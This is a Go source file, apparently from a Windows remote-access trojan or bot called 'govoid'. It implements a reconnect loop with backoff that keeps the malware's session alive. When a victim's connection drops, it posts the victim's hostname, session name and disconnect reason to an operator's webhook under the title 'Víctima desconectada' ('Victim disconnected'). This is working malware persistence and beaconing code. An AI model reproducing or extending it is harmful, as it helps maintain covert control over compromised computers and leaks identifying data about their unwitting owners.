//go:build windows

package bot

import (
	"context"
	"log/slog"
	"time"

	"github.com/local/govoid/internal/util"
)

const (
	initialBackoff = 3 * time.Second

	maxBackoff = 60 * time.Second

	stableAfter = 2 * time.Minute

	notifyAfter = 2
)

func RunWithReconnect(ctx context.Context, startFn func() error) {
	backoff := initialBackoff
	failures := 0

	for {
		if ctx.Err() != nil {
			return
		}

		util.WaitUntilOnline(ctx)
		if ctx.Err() != nil {
			return
		}

		hadSession := currentSession() != nil
		started := time.Now()
		err := startFn()

		if ctx.Err() != nil {
			return
		}

		markDisconnected()
		failures++

		reason := "conexión perdida"
		if err != nil {
			reason = err.Error()
		}
		slog.Debug("reconnect: sesión caída", "err", err, "intento", failures,
			"duracion_ms", time.Since(started).Milliseconds())

		if hadSession && failures == notifyAfter {
			fields := []util.EmbedField{
				{Name: "hostname", Value: hostnameForWebhook(), Inline: true},
			}
			if session := currentSession(); session != nil {
				fields = append(fields, util.EmbedField{
					Name:   "sesion",
					Value:  formatSessionName(session.SessionNum),
					Inline: true,
				})
			}
			fields = append(fields, util.EmbedField{
				Name:   "motivo",
				Value:  reason,
				Inline: false,
			})
			_ = util.PostWebhook("⚠ Víctima desconectada (reconectando...)", 15158332, fields)
		}

		if time.Since(started) > stableAfter {
			backoff = initialBackoff
			failures = 0
		}

		select {
		case <-ctx.Done():
			return
		case <-time.After(backoff):
		}

		backoff *= 2
		if backoff > maxBackoff {
			backoff = maxBackoff
		}
	}
}
